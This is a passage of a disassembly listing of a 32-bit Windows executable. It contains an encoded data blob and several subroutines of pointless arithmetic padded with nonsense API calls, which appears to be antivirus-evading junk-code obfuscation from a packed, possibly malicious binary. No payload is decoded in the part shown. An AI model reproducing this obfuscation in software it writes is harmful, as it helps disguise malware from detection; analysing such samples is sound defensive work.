; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00000460 (   1120.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_asgsdf		segment	para public 'CODE' use32
		assume cs:_asgsdf
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 26h,	0C7h, 6Ah, 82h,	98h, 82h, 96h, 0Ah, 1, 92h, 0BFh
		dd 47h,	61h, 4Ch, 13h, 0FBh, 3Fh, 12h, 0FAh, 17h, 71h
		dd 14h,	8Ah, 8Eh, 0A4h,	7Eh, 0D3h, 0D4h, 3Ah, 0C6h, 4
		dd 0Ch,	6Ah, 0F7h, 8Bh,	0Eh, 85h, 42h, 0F5h, 0E9h, 5Eh
		dd 6Ch,	0B8h, 86h, 0DDh, 15h, 73h, 94h,	0BEh, 4Eh, 0D0h
		dd 52h,	0B0h, 0A8h, 76h, 0E6h, 33h, 14h, 7Dh, 42h, 0F5h
		dd 0AFh, 89h, 0E9h, 58h, 0DBh, 0EEh, 0DBh, 0A5h, 47h, 64h
		dd 31h,	0DEh, 0B4h, 89h, 0B1h, 70h, 0A4h, 38h, 0EEh, 0B1h
		dd 31h,	0B1h, 9Ah, 0A8h, 0ACh, 3, 1Ah, 39h, 0CFh, 0D5h
		dd 57h,	0Ah, 20h, 54h, 14h, 0C0h, 5, 8Eh, 47h, 1Ah, 23h
		dd 0D4h, 0Eh, 4Fh, 0BCh, 0B2h, 93h, 8Eh, 2Ch, 0E0h, 50h
		dd 9Dh,	45h, 0Ch, 42h, 0A2h, 0EBh, 0E1h, 51h, 0BFh, 0B8h
		dd 91h,	3, 0EDh, 0F5h, 0A3h, 2Ah, 5Ah, 0D7h, 0ADh, 0Ah
		dd 9Ch,	0E7h, 0D9h, 9Eh, 40h, 0CDh, 96h, 0D1h, 30h, 92h
		dd 18h,	0D6h, 0C0h, 29h, 70h, 57h, 5Eh,	5Fh, 38h, 0FBh
		dd 69h,	0F8h, 10h, 36h,	0B0h, 1Fh, 0DBh, 0A2h, 0EBh, 21h
		dd 9Ah,	0C9h, 0E2h, 0B1h, 36h, 63h, 0F7h, 38h, 73h, 79h
		dd 3, 0Ch, 16h,	0CAh, 0DDh, 89h, 0E8h, 32h, 0ABh, 61h
		dd 0D2h, 0CAh, 75h, 0A3h, 9Ah, 47h, 0B5h, 0D0h,	26h, 5Ah
		dd 5Fh,	0C0h, 70h, 3Eh,	7Fh, 34h, 92h, 66h, 9Ah, 6, 59h
		dd 0EFh, 23h, 0D3h, 90h, 0F9h, 45h, 80h, 0Dh, 0B2h, 0BAh
		dd 35h,	0AEh, 3Bh, 0E0h, 0D5h, 47h, 33h, 8Eh, 0D6h, 75h
		dd 0F7h, 0B8h, 31h, 17h, 0C3h, 0EEh, 8Bh, 37h, 0F7h, 0C4h
		dd 0A7h, 0B8h, 3Ch, 28h, 0B4h, 22h, 42h, 0C9h, 0B8h, 1Eh
		dd 0CDh, 79h, 2Eh, 5Ch,	4, 71h,	2Eh, 0D3h, 36h,	5Fh, 0E2h
		dd 0FBh, 0F5h, 5Ch, 70h, 11h, 36h, 2Dh,	7Ch, 0F9h, 3Ch
		dd 1Ch,	0B5h, 0B1h, 9Fh, 11h, 0ABh, 81h, 0D1h, 53h, 19h
		dd 16h,	95h, 60h, 44h, 5Eh, 7Ch, 68h dup(0)
		dd 280h	dup(?)
_asgsdf		ends

; Section 2. (virtual address 00002000)
; Virtual size			: 000215CD ( 136653.)
; Section size in file		: 00021600 ( 136704.)
; Offset to raw	data for section: 00000A00
; Flags	60000020: Text Executable Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 402000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_402000	proc near		; CODE XREF: sub_409DF0+E2Fp
					; sub_409DF0+10DEp ...

var_25C		= dword	ptr -25Ch
var_250		= dword	ptr -250h
var_244		= dword	ptr -244h
var_240		= dword	ptr -240h
var_1C0		= word ptr -1C0h
var_1BC		= dword	ptr -1BCh
var_1A9		= byte ptr -1A9h
var_1A8		= word ptr -1A8h
var_1A4		= dword	ptr -1A4h
var_19C		= dword	ptr -19Ch
var_198		= word ptr -198h
var_144		= dword	ptr -144h
var_12C		= dword	ptr -12Ch
var_118		= word ptr -118h
var_10C		= dword	ptr -10Ch
var_108		= dword	ptr -108h
var_101		= byte ptr -101h
var_F4		= word ptr -0F4h
var_F0		= word ptr -0F0h
var_E5		= byte ptr -0E5h
var_D9		= byte ptr -0D9h
var_D8		= word ptr -0D8h
var_C8		= word ptr -0C8h
var_BD		= byte ptr -0BDh
var_BC		= word ptr -0BCh
var_B8		= dword	ptr -0B8h
var_B0		= dword	ptr -0B0h
var_AC		= word ptr -0ACh
var_A8		= dword	ptr -0A8h
var_90		= word ptr -90h
var_8C		= dword	ptr -8Ch
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 25Ch
		mov	eax, [ebp+arg_4]
		add	eax, 1Ch
		mov	[ebp+var_250], eax
		movzx	ecx, [ebp+var_198]
		mov	edx, 16h
		sub	edx, ecx
		xor	edx, 4Ah
		mov	[ebp+var_244], edx
		movzx	eax, [ebp+var_D8]
		sub	eax, [ebp+var_4]
		mov	ecx, [ebp+var_19C]
		and	ecx, 41h
		xor	eax, ecx
		mov	[ebp+var_BC], ax
		mov	edx, [ebp+var_240]
		add	edx, 45h
		mov	[ebp+var_B8], edx
		movzx	eax, [ebp+var_F4]
		or	eax, 46h
		mov	dword_42C040, eax
		mov	[ebp+var_250], 12h
		mov	ecx, 21h
		sub	ecx, [ebp+var_8C]
		movzx	edx, [ebp+var_E5]
		add	ecx, edx
		mov	[ebp+var_D9], cl
		mov	[ebp+var_19C], 2Ah
		movzx	eax, [ebp+var_E5]
		movzx	ecx, [ebp+var_1A9]
		add	eax, ecx
		and	eax, 1
		movzx	edx, [ebp+var_5]
		xor	edx, eax
		mov	[ebp+var_5], dl
		movzx	eax, [ebp+var_118]
		add	eax, 4Fh
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+arg_4]
		mov	[ebp+var_12C], ecx
		movzx	edx, [ebp+var_AC]
		sub	edx, 0Bh
		mov	[ebp+arg_4], edx
		mov	eax, [ebp+var_1BC]
		sub	eax, 19h
		mov	[ebp+var_A8], eax
		mov	ecx, [ebp+var_108]
		add	ecx, 37h
		movzx	edx, [ebp+var_1C0]
		sub	ecx, edx
		movzx	eax, [ebp+var_101]
		mov	edx, 2Fh
		sub	edx, eax
		or	ecx, edx
		mov	[ebp+var_D9], cl
		movzx	eax, [ebp+var_BC]
		add	eax, 5Ah
		movzx	ecx, [ebp+var_F0]
		sub	eax, ecx
		movzx	edx, [ebp+var_C8]
		sub	edx, eax
		mov	[ebp+var_C8], dx
		mov	eax, [ebp+var_10C]
		add	eax, 39h
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+var_1A4]
		sub	ecx, 6Dh
		movzx	edx, [ebp+var_AC]
		sub	ecx, edx
		mov	[ebp+var_BD], cl
		movzx	eax, [ebp+var_1A8]
		mov	ecx, [ebp+var_19C]
		sub	ecx, eax
		mov	[ebp+arg_4], ecx
		mov	dx, word ptr [ebp+var_1BC]
		mov	word ptr [ebp+var_250],	dx
		mov	[ebp+var_144], 16h
		mov	eax, [ebp+arg_8]
		sub	eax, [ebp+var_25C]
		mov	[ebp+var_19C], eax
		mov	ecx, [ebp+var_B0]
		add	ecx, 27h
		mov	[ebp+var_25C], ecx
		mov	edx, 53h
		sub	edx, [ebp+arg_8]
		and	edx, 2Dh
		or	edx, [ebp+arg_8]
		mov	[ebp+var_90], dx
		mov	eax, [ebp+var_1BC]
		mov	esp, ebp
		pop	ebp
		retn
sub_402000	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 254h
		mov	eax, [ebp-230h]
		xor	eax, 7Ch
		mov	[ebp-238h], ax
		movzx	ecx, byte ptr [ebp-7]
		and	ecx, 47h
		xor	ecx, 60h
		mov	edx, [ebp-240h]
		add	edx, [ebp+8]
		or	ecx, edx
		mov	[ebp-0F9h], cl
		mov	eax, 0A4h
		mov	[ebp-0D0h], ax
		mov	ecx, [ebp+1Ch]
		add	ecx, [ebp-1B0h]
		movzx	edx, word ptr [ebp-0CCh]
		sub	ecx, edx
		movzx	eax, word ptr [ebp-238h]
		xor	ecx, eax
		mov	[ebp-14h], cx
		mov	ecx, [ebp-0E4h]
		sub	ecx, [ebp-0F0h]
		mov	edx, [ebp-0F0h]
		lea	eax, [ecx+edx-19h]
		mov	[ebp-0F9h], al
		movzx	ecx, word ptr [ebp-14h]
		mov	edx, [ebp+8]
		sub	edx, ecx
		sub	edx, [ebp+1Ch]
		movzx	eax, word ptr [ebp-190h]
		sub	edx, eax
		mov	[ebp-0F8h], dx
		mov	ecx, 36h
		sub	ecx, [ebp+8]
		sub	ecx, [ebp+10h]
		mov	[ebp-10h], ecx
		push	2Ah
		call	ds:GetTextColor
		sub	eax, [ebp+0Ch]
		mov	edx, [ebp+18h]
		lea	eax, [eax+edx-0Bh]
		sub	eax, [ebp-234h]
		mov	[ebp-1A9h], al
		mov	dword ptr [ebp-254h], 0
		jmp	short loc_40229E
; ---------------------------------------------------------------------------

loc_40228F:				; CODE XREF: .text:0040232Aj
		mov	ecx, [ebp-254h]
		add	ecx, 1
		mov	[ebp-254h], ecx

loc_40229E:				; CODE XREF: .text:0040228Dj
		cmp	dword ptr [ebp-254h], 0Dh
		jge	loc_40232F
		mov	edx, [ebp-1B0h]
		mov	[ebp-34h], edx
		mov	eax, [ebp-0C8h]
		mov	[ebp-0E4h], eax
		movzx	ecx, word ptr [ebp-18h]
		sub	ecx, 3Dh
		and	ecx, [ebp+14h]
		and	ecx, 3Fh
		mov	[ebp-19Dh], cl
		movzx	edx, byte ptr [ebp-19h]
		mov	[ebp-0E4h], edx
		mov	eax, [ebp-1B8h]
		sub	eax, [ebp-0E4h]
		sub	eax, 5Ah
		movzx	ecx, word ptr [ebp-0B8h]
		and	eax, ecx
		mov	[ebp-1B4h], ax
		mov	dword ptr [ebp-0E4h], 44h
		mov	edx, [ebp-100h]
		sub	edx, [ebp-100h]
		mov	[ebp-1B8h], edx
		mov	eax, [ebp-240h]
		mov	[ebp-3Ch], eax
		mov	ecx, [ebp+1Ch]
		mov	[ebp-100h], ecx
		jmp	loc_40228F
; ---------------------------------------------------------------------------

loc_40232F:				; CODE XREF: .text:004022A5j
		movzx	edx, word ptr [ebp-0C0h]
		movzx	eax, byte ptr [ebp-19h]
		sub	edx, eax
		add	edx, 0Ah
		movzx	ecx, byte ptr [ebp-6]
		or	ecx, edx
		mov	[ebp-6], cl
		mov	dword ptr [ebp+18h], 38h
		mov	edx, [ebp+10h]
		mov	[ebp-1C4h], edx
		mov	eax, [ebp+8]
		mov	[ebp-240h], eax
		push	5Ah
		push	63h
		call	ds:StartDocW
		sub	eax, 3Ah
		movzx	ecx, word ptr [ebp-0D4h]
		sub	eax, ecx
		add	eax, 3Dh
		movzx	edx, byte ptr [ebp-6]
		sub	eax, edx
		mov	[ebp-19h], al
		mov	eax, [ebp+0Ch]
		sub	eax, 1Eh
		mov	[ebp-234h], eax
		mov	ecx, [ebp-0DCh]
		xor	ecx, 5Ah
		mov	[ebp+1Ch], ecx
		movzx	edx, byte ptr [ebp-112h]
		movzx	eax, byte ptr [ebp-0D5h]
		add	eax, edx
		mov	[ebp-0D5h], al
		movzx	ecx, word ptr [ebp-0B0h]
		movzx	edx, word ptr [ebp-0E8h]
		add	ecx, edx
		movzx	eax, word ptr [ebp-90h]
		sub	eax, ecx
		mov	[ebp-90h], ax
		mov	ecx, [ebp+1Ch]
		mov	[ebp-0ACh], ecx
		mov	eax, [ebp-240h]
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 25Ch
		push	esi
		movzx	eax, byte ptr [ebp-99h]
		mov	esi, 1Dh
		sub	esi, eax
		sub	esi, [ebp+0Ch]
		mov	ecx, [ebp-1ACh]
		push	ecx
		mov	edx, [ebp-250h]
		push	edx
		call	sub_408650
		add	esp, 8
		add	esi, eax
		mov	[ebp-1A4h], si
		movzx	eax, word ptr [ebp-20h]
		add	eax, 5Fh
		xor	eax, 24h
		mov	[ebp-0A8h], eax
		mov	ecx, [ebp-1B4h]
		sub	ecx, [ebp-0Ch]
		mov	[ebp-110h], ecx
		mov	edx, [ebp+8]
		mov	[ebp-164h], edx
		movzx	eax, byte ptr [ebp-109h]
		movzx	ecx, byte ptr [ebp-109h]
		add	eax, ecx
		mov	[ebp+8], eax
		movzx	edx, byte ptr [ebp-5]
		sub	edx, 55h
		movzx	eax, byte ptr [ebp-7]
		sub	edx, eax
		mov	[ebp-0B8h], edx
		mov	cx, [ebp-1B0h]
		mov	[ebp-0DCh], cx
		mov	edx, [ebp-1ACh]
		mov	[ebp-88h], edx
		push	50h
		mov	eax, [ebp-1BCh]
		push	eax
		mov	ecx, [ebp+8]
		push	ecx
		call	ds:EnumICMProfilesA
		movzx	edx, byte ptr [ebp-7]
		mov	ecx, [ebp-0C4h]
		lea	edx, [edx+ecx-75h]
		and	eax, edx
		mov	[ebp-255h], al
		mov	dword ptr [ebp-1ACh], 44h
		movzx	eax, word ptr [ebp-11Ch]
		add	eax, 47h
		mov	[ebp-11Ch], ax
		mov	ecx, 37h
		sub	ecx, [ebp-1BCh]
		mov	edx, [ebp-0Ch]
		lea	eax, [ecx+edx+18h]
		mov	[ebp-99h], al
		movzx	ecx, word ptr [ebp-14h]
		movzx	edx, word ptr [ebp-0CCh]
		add	ecx, edx
		movzx	eax, word ptr [ebp-19Ch]
		sub	eax, ecx
		mov	[ebp-19Ch], ax
		mov	eax, [ebp-1BCh]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_402520(int y,	int, int)
sub_402520	proc near		; CODE XREF: sub_407A90+11Bp

var_26C		= dword	ptr -26Ch
var_268		= dword	ptr -268h
var_25D		= byte ptr -25Dh
var_25C		= dword	ptr -25Ch
rop		= dword	ptr -254h
hdc		= dword	ptr -250h
var_24C		= dword	ptr -24Ch
var_248		= dword	ptr -248h
var_244		= word ptr -244h
var_240		= word ptr -240h
var_238		= dword	ptr -238h
var_1FC		= dword	ptr -1FCh
var_1D8		= dword	ptr -1D8h
var_1C0		= dword	ptr -1C0h
var_1BC		= word ptr -1BCh
var_1B8		= dword	ptr -1B8h
var_1B1		= byte ptr -1B1h
var_1A1		= byte ptr -1A1h
var_1A0		= word ptr -1A0h
var_198		= word ptr -198h
var_190		= word ptr -190h
var_112		= byte ptr -112h
var_111		= byte ptr -111h
var_10C		= dword	ptr -10Ch
var_108		= word ptr -108h
var_102		= byte ptr -102h
var_100		= word ptr -100h
var_FC		= word ptr -0FCh
var_F0		= word ptr -0F0h
var_E9		= byte ptr -0E9h
var_E8		= dword	ptr -0E8h
cy		= dword	ptr -0E4h
var_D8		= word ptr -0D8h
var_D0		= dword	ptr -0D0h
x1		= dword	ptr -0C4h
var_BD		= byte ptr -0BDh
var_BC		= word ptr -0BCh
var_B4		= word ptr -0B4h
var_AC		= word ptr -0ACh
var_A4		= dword	ptr -0A4h
var_A0		= word ptr -0A0h
var_9C		= dword	ptr -9Ch
var_98		= dword	ptr -98h
var_91		= byte ptr -91h
var_90		= word ptr -90h
var_20		= dword	ptr -20h
var_1A		= byte ptr -1Ah
var_19		= byte ptr -19h
var_18		= word ptr -18h
var_10		= dword	ptr -10h
var_5		= byte ptr -5
var_4		= dword	ptr -4
y		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		cmp	[ebp+var_9C], 5Fh
		jb	short loc_40253E
		mov	eax, [ebp+var_1B8]
		mov	[ebp+x1], eax

loc_40253E:				; CODE XREF: sub_402520+10j
		mov	ecx, [ebp+var_98]
		add	ecx, [ebp+var_10C]
		mov	[ebp+x1], ecx
		mov	edx, [ebp+arg_8]
		cmp	edx, [ebp+arg_4]
		jl	short loc_402562
		mov	[ebp+hdc], 5Eh

loc_402562:				; CODE XREF: sub_402520+36j
		mov	eax, [ebp+x1]
		mov	[ebp+var_98], eax
		mov	[ebp+var_1B8], 3Fh
		movzx	ecx, [ebp+var_112]
		add	ecx, 13h
		mov	dword_42C034, ecx
		mov	edx, [ebp+var_1B8]
		add	edx, [ebp+cy]
		add	edx, [ebp+var_248]
		sub	edx, [ebp+var_1C0]
		mov	[ebp+var_BC], dx
		movzx	eax, [ebp+var_FC]
		add	eax, [ebp+cy]
		mov	[ebp+var_98], eax
		movzx	ecx, [ebp+var_198]
		movzx	edx, [ebp+var_B4]
		sub	edx, ecx
		mov	[ebp+var_B4], dx
		movzx	eax, [ebp+var_111]
		add	eax, 3Eh
		and	eax, 5Ah
		mov	[ebp+var_10], eax
		movzx	ecx, [ebp+var_5]
		sub	ecx, 27h
		mov	[ebp+var_A4], ecx
		mov	edx, [ebp+rop]
		xor	edx, 1Ah
		mov	[ebp+y], edx
		mov	eax, [ebp+arg_8]
		push	eax
		call	sub_4098E0
		add	esp, 4
		add	eax, 5Bh
		mov	[ebp+var_10C], eax
		mov	ecx, [ebp+hdc]
		mov	[ebp+var_1FC], ecx
		mov	[ebp+x1], 2Eh
		mov	edx, [ebp+x1]
		mov	[ebp+var_26C], edx
		cmp	[ebp+var_26C], 0
		jz	short loc_402655
		cmp	[ebp+var_26C], 1
		jz	short loc_40269A
		cmp	[ebp+var_26C], 2
		jz	loc_4026D7
		jmp	loc_40271E
; ---------------------------------------------------------------------------

loc_402655:				; CODE XREF: sub_402520+118j
		movzx	eax, [ebp+var_91]
		add	eax, 29h
		mov	[ebp+arg_8], eax
		mov	ecx, 1
		test	ecx, ecx
		jz	short loc_402695
		movzx	edx, [ebp+var_100]
		and	edx, [ebp+var_4]
		xor	edx, [ebp+var_24C]
		movzx	eax, [ebp+var_AC]
		or	edx, eax
		mov	[ebp+var_AC], dx
		mov	[ebp+cy], 7Bh

loc_402695:				; CODE XREF: sub_402520+149j
		jmp	loc_402727
; ---------------------------------------------------------------------------

loc_40269A:				; CODE XREF: sub_402520+121j
		movzx	ecx, [ebp+var_E9]
		movzx	edx, [ebp+var_FC]
		lea	eax, [edx+ecx-3Bh]
		mov	[ebp+var_FC], ax
		movzx	ecx, [ebp+var_AC]
		movzx	edx, [ebp+var_111]
		and	ecx, edx
		mov	[ebp+var_1C0], ecx
		movzx	eax, [ebp+var_102]
		mov	dword_42C04C, eax
		jmp	short loc_402727
; ---------------------------------------------------------------------------

loc_4026D7:				; CODE XREF: sub_402520+12Aj
		movzx	ecx, [ebp+var_19]
		movzx	edx, [ebp+var_240]
		mov	eax, [ebp+var_238]
		lea	edx, [eax+edx+1Fh]
		and	ecx, edx
		mov	[ebp+var_1A1], cl
		movzx	eax, [ebp+var_1A]
		movzx	ecx, [ebp+var_244]
		add	ecx, eax
		mov	[ebp+var_244], cx
		movzx	edx, [ebp+var_D8]
		mov	eax, 8Ch
		sub	eax, edx
		mov	[ebp+var_25C], eax
		jmp	short loc_402727
; ---------------------------------------------------------------------------

loc_40271E:				; CODE XREF: sub_402520+130j
		mov	ecx, [ebp+var_24C]
		mov	[ebp+arg_4], ecx

loc_402727:				; CODE XREF: sub_402520:loc_402695j
					; sub_402520+1B5j ...
		mov	byte ptr [ebp+var_24C],	9
		mov	[ebp+var_1D8], 18h
		mov	edx, [ebp+var_E8]
		mov	[ebp+var_98], edx
		mov	eax, [ebp+rop]
		push	eax		; rop
		push	2Dh		; y1
		mov	ecx, [ebp+x1]
		push	ecx		; x1
		push	22h		; hdcSrc
		mov	edx, [ebp+cy]
		push	edx		; cy
		mov	eax, [ebp+var_1B8]
		push	eax		; cx
		mov	ecx, [ebp+y]
		push	ecx		; y
		push	51h		; x
		mov	edx, [ebp+hdc]
		push	edx		; hdc
		call	ds:BitBlt
		mov	ecx, [ebp+var_248]
		add	ecx, 15h
		movzx	edx, [ebp+var_1A]
		sub	ecx, edx
		add	ecx, 31h
		xor	eax, ecx
		mov	[ebp+var_BD], al
		mov	[ebp+var_268], 0
		jmp	short loc_4027AC
; ---------------------------------------------------------------------------

loc_40279D:				; CODE XREF: sub_402520+325j
		mov	eax, [ebp+var_268]
		add	eax, 1
		mov	[ebp+var_268], eax

loc_4027AC:				; CODE XREF: sub_402520+27Bj
		cmp	[ebp+var_268], 0Ch
		jge	loc_40284A
		movzx	ecx, [ebp+var_100]
		movzx	edx, [ebp+var_190]
		sub	edx, [ebp+y]
		add	edx, [ebp+var_20]
		or	ecx, edx
		mov	[ebp+var_18], cx
		mov	eax, [ebp+var_248]
		xor	eax, 2Ch
		mov	[ebp+var_1C0], eax
		mov	ecx, [ebp+rop]
		add	ecx, 47h
		and	ecx, [ebp+x1]
		mov	[ebp+var_238], ecx
		movzx	edx, [ebp+var_D8]
		sub	edx, [ebp+var_98]
		movzx	eax, [ebp+var_111]
		lea	ecx, [edx+eax-1Eh]
		mov	[ebp+var_1A0], cx
		mov	edx, [ebp+y]
		mov	[ebp+var_98], edx
		mov	ax, word ptr [ebp+var_1B8]
		mov	[ebp+var_F0], ax
		movzx	ecx, [ebp+var_90]
		mov	edx, 4Fh
		sub	edx, ecx
		sub	edx, 54h
		mov	[ebp+var_1BC], dx
		jmp	loc_40279D
; ---------------------------------------------------------------------------

loc_40284A:				; CODE XREF: sub_402520+293j
		movzx	eax, [ebp+var_244]
		sub	eax, 1Fh
		xor	eax, [ebp+x1]
		mov	[ebp+var_D0], eax
		movzx	ecx, [ebp+var_AC]
		add	ecx, 0Ah
		sub	ecx, [ebp+arg_4]
		mov	[ebp+var_1BC], cx
		mov	edx, [ebp+var_20]
		sub	edx, 3
		mov	[ebp+var_19], dl
		movzx	eax, [ebp+var_108]
		movzx	ecx, [ebp+var_A0]
		sub	eax, ecx
		movzx	edx, [ebp+var_25D]
		sub	eax, edx
		mov	[ebp+var_1B1], al
		mov	eax, [ebp+var_1C0]
		mov	esp, ebp
		pop	ebp
		retn
sub_402520	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 244h
		push	esi
		cmp	dword ptr [ebp+18h], 0Eh
		jnz	short loc_4028D6
		mov	eax, [ebp-0E4h]
		mov	[ebp+8], eax
		movzx	ecx, word ptr [ebp-90h]
		or	ecx, 25h
		mov	[ebp+0Ch], ecx

loc_4028D6:				; CODE XREF: .text:004028BEj
		mov	dword ptr [ebp-68h], 13h
		movzx	edx, byte ptr [ebp-19Dh]
		mov	eax, 3Dh
		sub	eax, edx
		add	eax, [ebp+8]
		mov	[ebp-4], eax
		movzx	ecx, byte ptr [ebp+0Ch]
		mov	[ebp-0B0h], ecx
		mov	dword ptr [ebp+10h], 0Ah
		mov	byte ptr [ebp-1Ah], 7Bh
		movzx	edx, word ptr [ebp-0B4h]
		sub	edx, 24h
		mov	[ebp-0B4h], dx
		mov	eax, [ebp-1B8h]
		push	eax
		push	2Ch
		mov	ecx, [ebp-0E4h]
		push	ecx
		push	36h
		call	ds:GetTapeParameters
		mov	edx, [ebp-0B0h]
		sub	edx, eax
		mov	[ebp+18h], edx
		movzx	eax, word ptr [ebp-0BCh]
		mov	ecx, [ebp-0B0h]
		lea	edx, [eax+ecx+55h]
		mov	[ebp-10h], edx
		movzx	eax, word ptr [ebp-0DCh]
		add	eax, [ebp-0B0h]
		sub	eax, [ebp+14h]
		mov	[ebp-98h], eax
		mov	ecx, [ebp-0E4h]
		mov	[ebp-214h], ecx
		movzx	edx, byte ptr [ebp-0E9h]
		mov	eax, 18h
		sub	eax, edx
		movzx	ecx, word ptr [ebp-114h]
		mov	edx, [ebp-20h]
		sub	edx, ecx
		add	edx, 48h
		and	eax, edx
		mov	[ebp-6], al
		mov	eax, [ebp-20h]
		sub	eax, 0C6h
		sub	eax, [ebp-0B0h]
		and	eax, [ebp+8]
		mov	[ebp-241h], al
		movzx	esi, word ptr [ebp-19Ch]
		add	esi, 39h
		mov	ecx, [ebp+10h]
		push	ecx
		mov	edx, [ebp-0B0h]
		push	edx
		mov	eax, [ebp-20h]
		push	eax
		mov	ecx, [ebp+8]
		push	ecx
		mov	edx, [ebp-1B8h]
		push	edx
		mov	eax, [ebp-0B0h]
		push	eax
		call	sub_407380
		add	esp, 18h
		sub	esi, eax
		mov	[ebp-1A8h], esi
		movzx	ecx, word ptr [ebp-14h]
		mov	edx, 4Dh
		sub	edx, ecx
		mov	eax, [ebp-0A8h]
		lea	ecx, [edx+eax+23h]
		mov	[ebp-241h], cl
		movzx	edx, word ptr [ebp-18h]
		movzx	eax, word ptr [ebp-0D8h]
		add	edx, eax
		mov	[ebp+10h], edx
		mov	ecx, [ebp-240h]
		mov	[ebp-20h], ecx
		movzx	edx, word ptr [ebp-0BCh]
		mov	eax, [ebp-0F8h]
		sub	eax, edx
		mov	[ebp+10h], eax
		mov	ecx, [ebp-20h]
		mov	[ebp-1DCh], ecx
		movzx	edx, byte ptr [ebp-101h]
		mov	eax, [ebp-1B8h]
		sub	eax, edx
		and	eax, 0Bh
		mov	[ebp-4], eax
		movzx	ecx, word ptr [ebp-184h]
		add	ecx, 3Fh
		movzx	edx, word ptr [ebp-100h]
		sub	ecx, edx
		movzx	eax, word ptr [ebp-19Ch]
		add	eax, ecx
		mov	[ebp-19Ch], ax
		mov	ecx, [ebp+14h]
		mov	[ebp-214h], ecx
		mov	edx, 38h
		sub	edx, [ebp-1B8h]
		or	edx, 0FFFFFFF0h
		mov	[ebp-14h], dx
		movzx	eax, word ptr [ebp-184h]
		sub	eax, 4Ah
		movzx	ecx, byte ptr [ebp-19Dh]
		or	ecx, eax
		mov	[ebp-19Dh], cl
		mov	edx, [ebp-0B8h]
		mov	[ebp-0E4h], edx
		mov	eax, [ebp-20h]
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 25Ch
		movzx	eax, byte ptr [ebp-19h]
		mov	ecx, [ebp+10h]
		sub	ecx, eax
		mov	[ebp-1A8h], ecx
		lea	edx, [ebp-1BCh]
		sub	edx, 49h
		mov	eax, [edx]
		mov	[ebp-254h], eax
		mov	ecx, [ebp-0D8h]
		mov	[ebp-158h], ecx
		movzx	edx, word ptr [ebp-10Ch]
		sub	edx, 55h
		mov	[ebp-1A8h], edx
		movzx	eax, byte ptr [ebp-0B5h]
		sub	eax, 53h
		sub	eax, [ebp+14h]
		mov	[ebp-0A0h], eax
		movzx	ecx, byte ptr [ebp+10h]
		mov	[ebp-258h], ecx
		mov	dword ptr [ebp-78h], 20h
		mov	dl, [ebp-1ACh]
		mov	[ebp-0B5h], dl
		movzx	eax, word ptr [ebp-254h]
		mov	[ebp-258h], eax
		mov	ecx, [ebp-258h]
		mov	[ebp-160h], ecx
		mov	edx, [ebp-0DCh]
		add	edx, 2Ah
		sub	edx, [ebp+14h]
		or	edx, 62h
		mov	[ebp-0CCh], dx
		mov	eax, 0FFFFFFDDh
		sub	eax, [ebp-254h]
		mov	[ebp-0C4h], eax
		mov	cl, [ebp-198h]
		mov	[ebp-0D1h], cl
		mov	edx, [ebp+14h]
		add	edx, 0B5h
		movzx	eax, byte ptr [ebp-0B5h]
		sub	edx, eax
		movzx	ecx, byte ptr [ebp-91h]
		sub	edx, ecx
		mov	[ebp-91h], dl
		mov	edx, 6
		sub	edx, [ebp-0DCh]
		sub	edx, [ebp-1A8h]
		add	edx, 0Dh
		mov	[ebp-10Ch], dx
		mov	eax, dword_42C040
		add	eax, 41h
		mov	dword_42C040, eax
		mov	ecx, [ebp-1A8h]
		add	ecx, 2Fh
		sub	ecx, [ebp-114h]
		and	ecx, 44h
		mov	[ebp-0D0h], cx
		mov	edx, [ebp-254h]
		mov	[ebp-258h], edx
		mov	eax, 27h
		mov	[ebp+8], ax
		movzx	ecx, byte ptr [ebp-0E1h]
		add	ecx, [ebp-114h]
		mov	[ebp-0DCh], ecx
		mov	edx, [ebp-0DCh]
		mov	eax, [ebp+14h]
		lea	ecx, [eax+edx+4Dh]
		sub	ecx, [ebp-258h]
		sub	ecx, 56h
		mov	[ebp-0FEh], cl
		mov	eax, [ebp-1A8h]
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_402C40	proc near		; CODE XREF: sub_407A90+1A3p

var_2B1C	= dword	ptr -2B1Ch
var_2B18	= dword	ptr -2B18h
var_2B14	= dword	ptr -2B14h
var_2B10	= dword	ptr -2B10h
var_2B09	= byte ptr -2B09h
var_2B04	= word ptr -2B04h
var_2B00	= word ptr -2B00h
var_2AFC	= dword	ptr -2AFCh
var_2AF8	= dword	ptr -2AF8h
var_2AF4	= word ptr -2AF4h
var_2AEC	= word ptr -2AECh
var_2AB8	= dword	ptr -2AB8h
var_2A80	= dword	ptr -2A80h
